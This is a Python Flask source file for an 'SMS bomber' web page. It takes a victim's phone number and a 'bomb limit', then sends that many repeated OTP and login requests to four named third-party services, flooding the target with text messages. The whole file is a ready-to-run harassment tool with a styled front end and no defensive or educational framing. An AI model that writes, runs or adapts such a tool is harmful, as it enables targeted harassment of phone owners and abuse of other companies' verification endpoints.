import urllib.parse
import requests
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def send_sms():
    if request.method == 'POST':
        phone_number = request.form.get('number')
        bomb_limit = int(request.form.get('value'))

        try:
            response_data = {}

            # Send request to each API based on the bomb limit
            for i in range(bomb_limit):
                # Send request to first API
                first_api_url = f"https://www.teamdccs.xyz/sms.php?number={urllib.parse.quote(phone_number)}"
                response = requests.get(first_api_url).text
                response_data[f"First API - Request {i+1}"] = response

                # Send request to second API
                second_api_url = "https://apix.rabbitholebd.com/appv2/login/requestOTP"
                second_api_payload = {"mobile": phone_number}
                second_api_headers = {"Content-Type": "application/json"}
                second_api_response = requests.post(second_api_url, json=second_api_payload, headers=second_api_headers).json()
                response_data[f"Second API - Request {i+1}"] = second_api_response

                # Send request to third API
                third_api_url = "http://nesco.sslwireless.com/api/v1/login"
                third_api_payload = {"phone_number": phone_number}
                third_api_headers = {"Content-Type": "application/json"}
                third_api_response = requests.post(third_api_url, json=third_api_payload, headers=third_api_headers).json()
                response_data[f"Third API - Request {i+1}"] = third_api_response

                # Send request to fourth API
                formatted_phone_number = "+88" + phone_number
                fourth_api_url = "https://api3.bioscopelive.com/auth/api/login/send-otp"
                fourth_api_payload = {"operator": "all", "msisdn": formatted_phone_number}
                fourth_api_headers = {"Content-Type": "application/json"}
                fourth_api_response = requests.post(fourth_api_url, json=fourth_api_payload, headers=fourth_api_headers).json()
                response_data[f"Fourth API - Request {i+1}"] = fourth_api_response

            dialog = """
            <div style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 300px; padding: 20px; background-color: #f1f1f1; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);">
                <h2 style="margin-top: 0;">Status</h2>
        """

            for api_name, api_response in response_data.items():
                dialog += f"<p>{api_name} Response: {api_response}</p>"

            dialog += """
                <button onclick="closeDialog()">Back</button>
            </div>
            <script>
                function closeDialog() {
                    var dialog = document.getElementById('dialog');
                    dialog.parentNode.removeChild(dialog);
                }
            </script>
            """

            return render_template('index.html', dialog=dialog)

        except requests.exceptions.RequestException as e:
            error_dialog = """
            <div style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 300px; padding: 20px; background-color: #f1f1f1; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);">
                <h2 style="margin-top: 0;">Error</h2>
                <p>An error occurred during API request: {str(e)}</p>
                <button onclick="closeDialog()">Back</button>
            </div>
            <script>
                function closeDialog() {
                    var dialog = document.getElementById('dialog');
                    dialog.parentNode.removeChild(dialog);
                }
            </script>
            """

            return render_template('index.html', dialog=error_dialog)

    return '''

<!DOCTYPE html>
<html>
<head>
    <title>Team Peaky-XD</title>
    <style>
        body {
            background-color: black;
            color: red;
            font-family: Arial, sans-serif;
            text-align: center;
        }

        #logo {
            width: 100px;
            height: 100px;
            margin: 0 auto;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 50px;
            position: relative;
        }

        #logo::before {
            content: "";
            position: absolute;
            top: -5px;
            left: -5px;
            right: -5px;
            bottom: -5px;
            border: 1px solid red;
            border-radius: 50%;
            animation: glowing-border 2s linear infinite;
        }

        @keyframes glowing-border {
            0% {
                box-shadow: 0 0 5px red;
            }
            50% {
                box-shadow: 0 0 10px red;
            }
            100% {
                box-shadow: 0 0 5px red;
            }
        }

        #logo img {
            width: 90%;
            height: 90%;
            border-radius: 20%;
        }

        .form {
            border: 2px solid red;
            border-radius: 10px;
            margin: 50px auto;
            padding: 20px;
            max-width: 500px;
            animation: glowing-line 2s linear infinite;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        label {
            display: block;
            margin-bottom: 10px;
            text-align: left;
        }

        input[type="number"],
        input[type="text"] {
            width: 100%;
            padding: 10px;
            border-radius: 20px;
            border: 2px solid red;
            background-color: black;
            color: red;
            margin-bottom: 20px;
            box-shadow: 0 0 5px red;
            font-size: 16px;
            transition: all 0.3s ease;
            outline: none;
        }

        input[type="number"]:focus,
        input[type="text"]:focus {
            transform: scale(1.05); /* Increase size when focused */
            box-shadow: 0 0 10px red;
        }

        input[type="submit"] {
            padding: 15px 30px;
            border-radius: 30px;
            border: none;
            background-color: red;
            color: black;
            font-size: 18px;
            cursor: pointer;
            box-shadow: 0 0 10px black;
            transition: all 0.3s ease;
        }

        input[type="submit"]:hover {
            background-color: #990000;
            transform: scale(1.1); /* Increase size on hover */
        }


        #footer {
            margin-top: 50px;
            padding: 20px;
            background-color: black;
            font-family: "Arial Black", sans-serif;
            font-size: 14px;
            color: red;
        }

        #footer a {
            font-weight: 700;
            color: #BA68C8;
            text-decoration: none;
        }

        #footer p {
            margin: 0;
        }

        @keyframes glowing-line {
            0% {
                box-shadow: 0 0 10px red;
            }
            50% {
                box-shadow: 0 0 20px red;
            }
            100% {
                box-shadow: 0 0 10px red;
            }
        }
    </style>
</head>
<body>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <div id="logo">
        <img src="https://drive.google.com/uc?export=view&id=1-eVQG1sm7Niou62Ij6naUbfVycmIs3Po" alt="Alva">
    </div>
    <div class="form">
        <form action="/" method="post">
            <label for="number">Number :</label>
            <input type="number" id="number" name="number" placeholder="Number Without +88" required>
            <label for="value">Bomber Limit :</label>
            <input type="text" id="value" name="value" placeholder="Bomb Limit" required>
            <input type="submit" value="Submit">
        </form>
    </div>
    <div id="footer">
        <p>&copy; 2022 Ahamed Alif(Alva). All rights reserved.</p>
    </div>
</body>
</html>


    '''

if __name__ == '__main__':
    app.run()
